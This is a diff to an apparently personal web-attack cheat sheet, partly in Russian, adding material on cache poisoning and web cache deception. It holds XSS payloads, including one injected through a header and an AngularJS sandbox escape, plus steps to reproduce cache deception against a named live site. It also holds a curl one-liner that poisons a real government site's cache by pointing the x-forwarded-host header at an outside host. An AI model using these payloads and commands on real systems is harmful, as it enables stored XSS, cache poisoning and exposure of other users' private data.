@@ -468,6 +468,10 @@ Title: javascript:
 Format: Markdown
 Content: [XSS](.alert(1);)
 
+XSS через заголовок
+Связать отравление кэша с сохраненным XSS. Создать уникальный ключ и добавил стиль заголовка с полезной нагрузкой XSS и запустить запрос. www.redacted.com/?q=admin&liec4897=1
+style: dsfsdfsdfsdf"><script>alert(9)</script><!--
+
 ANGULAR
 ?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
   
@@ -475,6 +479,19 @@ ANGULAR
 
 **Practical Web Cache Poisoning**
 ```
+Что более разумно и распространено для кеширования - это статические, общедоступные файлы: таблицы стилей (css), скрипты (js), текстовые файлы (txt), изображения (png, bmp, gif) и т.д.
+
+Что происходит при доступе к URL-адресу, например http://www.example.com/home.php/non-existent.css?
+
+В зависимости от технологии и конфигурации (для разных серверов структура URL может потребоваться несколько отличаться), сервер возвращает содержимое http://www.example.com/home.php. И да, URL остается http://www.example.com/home.php/non-existent.css. Заголовки HTTP будут такими же, как и для прямого доступа к http://www.example.com/home.php: те же заголовки кэширования и тот же тип контента
+
+Steps To Reproduce:
+Login to your account.
+Go to https://chaturbate.com/my_collection/.
+Then after go to https://chaturbate.com/my_collection/min.js.
+Open private mode (Incognito window) or Any other browser and paste https://chaturbate.com/my_collection/min.js url in address bar.
+
+Через curl
 url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"
 
 An attacker can easily poison the cache in arbitrary regions by using a service like https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:
@@ -935,6 +952,15 @@ https://portswigger.net/research/practical-web-cache-poisoning
 
 Bypassing Web Cache Poisoning Countermeasures
 https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures
+
+Web-cache-deception-attack
+https://bo0om.ru/web-cache-deception-attack
+
+Web-Cache-Deception-Attack
+https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf
+
+Web Cache Deception Attack leads to user info disclosure
+https://medium.com/@kunal94/web-cache-deception-attack-leads-to-user-info-disclosure-805318f7bb29
 
 HTTP Desync Attacks: Request Smuggling Reborn
 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
